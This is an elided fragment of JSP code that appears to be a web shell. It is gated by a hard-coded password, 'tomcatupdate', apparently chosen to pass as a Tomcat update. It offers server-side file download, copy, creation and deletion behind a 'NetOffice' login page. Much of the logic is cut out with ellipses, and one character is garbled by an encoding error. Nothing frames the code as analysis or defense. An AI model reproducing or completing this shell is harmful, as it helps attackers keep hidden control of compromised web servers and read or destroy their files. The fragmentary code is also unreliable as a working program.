...
private String _password = "tomcatupdate";
...
if(strAction!=null && strAction.equals("down"))
{
	...
	if(f.length()==0)
	{
		sbDown.append("File size is 0, no need to download");
	}
	else
	{
...
if(strAction!=null && strAction.equals("copy"))
{
	...
	sbCopy.append("Dest File:  <input type=text name=file2 size=40 value='"+strDir+"'><p>");
...
if(strAction!=null && strAction.equals("savecopy"))
{
	...
	else
	{
		...
		if(f_des.isFile())
		{
			sbSaveCopy.append("<p><font color=red>Dest file exists, cannot be copied¡£</font>");
		}
		else
		{
			...
			sbSaveCopy.append("<font color=red>Copied Success.</font>");			
		}		
	}	
...
if(strAction!=null && strAction.equals("newFile"))
{
	...
	{		
			...
			if(strType.equals("File") && !f_new.createNewFile())
				sbNewFile.append(strF+" Create file failure");
			if(strType.equals("Dir") && !f_new.mkdirs())
				sbNewFile.append(strF+" Create dir failure");
	}
	else
	{
		sbNewFile.append("<p><font color=red>Create file or dir error.</font>");
	}
}
...
function doForm(action,path,file,cmd,tab,content)
{
	...
	if(action=="del")
	{
		if(confirm("Are u sure to delete "+File))
      ...
      <td class="tr1">
        <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
          <tr>
            ...
            <TD align="right"><FONT color="#d2d8ec"><b>NetOffice</b></FONT></TD>
          </tr>
...
// end of the login form
	...
	if (session.getAttribute("password") == null) {
		...
		if (validate(password) == false) {
			out.println("<div align=\"center\"><font color=\"red\"><li>Bad luck!</font></div>");
			out.close();
			return;
		}
...
{
	out.println("<font color=red>failure:  "+e.toString()+"</font>");
}
%>
